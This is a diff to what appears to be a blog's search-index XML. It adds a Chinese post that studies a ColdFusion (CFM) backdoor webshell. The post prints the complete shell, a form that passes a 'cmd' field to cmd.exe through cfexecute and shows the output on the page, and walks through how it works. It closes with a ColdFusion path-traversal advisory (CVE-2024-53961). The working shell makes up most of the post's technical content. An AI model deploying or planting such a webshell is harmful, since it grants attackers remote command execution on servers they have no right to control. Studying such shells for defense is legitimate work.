@@ -1,5 +1,22 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?><search><entry><title>日常杂谈</title><url>/myday/mydayone.html</url><categories><category>myday</category></categories><tags><tag>myday</tag></tags><content type="html">  日常杂谈专区建设成功 只需要在content文件夹下新建myday文件夹，再把archives文件夹下的_index.md文件移动进来即可新建栏目。
-  </content></entry><entry><title>用phpstudy 创建Flarum</title><url>/post/%E7%94%A8-phpstudy-%E5%88%9B%E5%BB%BA-flarum-/</url><categories><category>Flarum</category></categories><tags><tag>Flarum</tag></tags><content type="html"><![CDATA[  用 phpstudy 创建Flarum 安装 环境
+  </content></entry><entry><title>CFM后门马的学习研究</title><url>/post/cfm%E5%90%8E%E9%97%A8%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6/</url><categories><category>shell</category></categories><tags><tag>shell</tag></tags><content type="html"><![CDATA[  在木马文件夹中发现一类叫CFM后门马的木马，没见过来学习一下。
+CFM文件是什么 CFM 文件是一个包含 ColdFusion 代码或 CFML（ColdFusion 标记语言）的网页。当用户访问该页面时，它会由 ColdFusion 网络服务器动态执行
+2种文件类型 使用 .cfm 文件扩展名。
+ColdFusion标记文件 dBASE自定义表单 开发者：Adobe系统
+打开方式：Adobe ColdFusion
+ColdFusion 是由 Adobe Systems 创建的一个网页开发平台，广泛用于构建动态网站和网页应用程序。
+开发人员通常使用Adobe ColdFusion Builder来创建CFML应用程序。然而，他们可能会使用各种其他CFML IDE和编辑器，例如Adobe Dreamweaver、CFEclipse（Eclipse的插件）和CFBrackets（Brackets源代码编辑器的扩展）
+ColdFusion 最初由 Allaire 开发，后来被 Macromedia 收购，现在由 Adobe Systems 在 2005 年收购 Macromedia 后分发。
+CFM程序运行步骤 确保您在服务器上安装并配置了 Adobe ColdFusion。 将CFM文件放置在您的ColdFusion网站根目录的适当目录中（通常位于wwwroot或webapps目录中）。 打开一个网页浏览器并访问http://yourserver.com/path/to/yourfile.cfm。 您应该在浏览器中看到 CFM 文件处理后的输出。 CFM木马攻击范围 ColdFusion 服务器运行的CFM程序，类似于php文件。
+本次研究的主要内容 研究代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=gb2312&#34;&gt; &lt;title&gt;CFM shell&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;!--- os.run ---&gt; &lt;cfif IsDefined(&#34;FORM.cmd&#34;)&gt; &lt;cfoutput&gt;#cmd#&lt;/cfoutput&gt; &lt;cfexecute name=&#34;C:\Winnt\System32\cmd.exe&#34; arguments=&#34;/c #cmd#&#34; outputfile=&#34;#GetTempDirectory()#foobar.txt&#34; timeout=&#34;1&#34;&gt; &lt;/cfexecute&gt; &lt;/cfif&gt; &lt;form action=&#34;&lt;cfoutput&gt;#CGI.SCRIPT_NAME#&lt;/cfoutput&gt;&#34; method=&#34;post&#34;&gt; &lt;input type=text size=45 name=&#34;cmd&#34; &gt; &lt;input type=Submit value=&#34;run&#34;&gt; &lt;/form&gt; &lt;cfif FileExists(&#34;#GetTempDirectory()#foobar.txt&#34;) is &#34;Yes&#34;&gt; &lt;cffile action=&#34;Read&#34; file=&#34;#GetTempDirectory()#foobar.txt&#34; variable=&#34;readText&#34;&gt; &lt;textarea readonly cols=80 rows=20&gt; &lt;CFOUTPUT&gt;#readText#&lt;/CFOUTPUT&gt; &lt;/textarea&gt; &lt;cffile action=&#34;Delete&#34; file=&#34;#GetTempDirectory()#foobar.txt&#34;&gt; &lt;/cfif&gt; &lt;/body&gt; &lt;/html&gt; 去掉html标签后，主要研究的两部分
+首先是对程序的读，启动cmd，来进行命令行控制，在页面的表格中获取到想执行的命令，成功执行并写入到foobar.txt中。
+1 2 3 4 5 6 7 8 9 10 11 12 13 &lt;!--- os.run ---&gt; &lt;cfif IsDefined(&#34;FORM.cmd&#34;)&gt; &lt;cfoutput&gt;#cmd#&lt;/cfoutput&gt; &lt;cfexecute name=&#34;C:\Winnt\System32\cmd.exe&#34; arguments=&#34;/c #cmd#&#34; outputfile=&#34;#GetTempDirectory()#foobar.txt&#34; timeout=&#34;1&#34;&gt; &lt;/cfexecute&gt; &lt;/cfif&gt; &lt;form action=&#34;&lt;cfoutput&gt;#CGI.SCRIPT_NAME#&lt;/cfoutput&gt;&#34; method=&#34;post&#34;&gt; &lt;input type=text size=45 name=&#34;cmd&#34; &gt; &lt;input type=Submit value=&#34;run&#34;&gt; &lt;/form&gt; 对foobar.txt文件的读并显示到页面然后再删除文件。
+1 2 3 4 5 6 7 8 9 10 &lt;cfif FileExists(&#34;#GetTempDirectory()#foobar.txt&#34;) is &#34;Yes&#34;&gt; &lt;cffile action=&#34;Read&#34; file=&#34;#GetTempDirectory()#foobar.txt&#34; variable=&#34;readText&#34;&gt; &lt;textarea readonly cols=80 rows=20&gt; &lt;CFOUTPUT&gt;#readText#&lt;/CFOUTPUT&gt; &lt;/textarea&gt; &lt;cffile action=&#34;Delete&#34; file=&#34;#GetTempDirectory()#foobar.txt&#34;&gt; &lt;/cfif&gt; ColdFusion相关安全漏洞 Adobe ColdFusion路径遍历漏洞 (CVE-2024-53961)
+**危害描述：**未经身份验证的远程攻击者可以利用此漏洞访问应用程序设置的受限目录之外的文件或目录，从而导致敏感信息泄露或系统数据被操纵。
+影响版本
+Adobe ColdFusion 2023 &lt;= Update 11
+Adobe ColdFusion 2021 &lt;= Update 17
+更多阅读 CFM的历史 web - 上古开发神器之Coldfusion   ]]></content></entry><entry><title>用phpstudy 创建Flarum</title><url>/post/%E7%94%A8-phpstudy-%E5%88%9B%E5%BB%BA-flarum-/</url><categories><category>Flarum</category></categories><tags><tag>Flarum</tag></tags><content type="html"><![CDATA[  用 phpstudy 创建Flarum 安装 环境
 1 2 Nginx1.15.11 Mysql5.7.26 Plain textCopy将对应的压缩包解压到 phpstudy 的 www 文件夹下，我选择的是无 public 路径版本。
 进入到 phpstudy 创建对应的数据库，记住数据库名字和账号密码。点击网站管理打开网站即可，一路安装。进去后找到控制台，点击进去后发现 404，需要配置好 nginx.htaccess
 在文网站根目录下找到 nginx.htaccess，输入下列代码
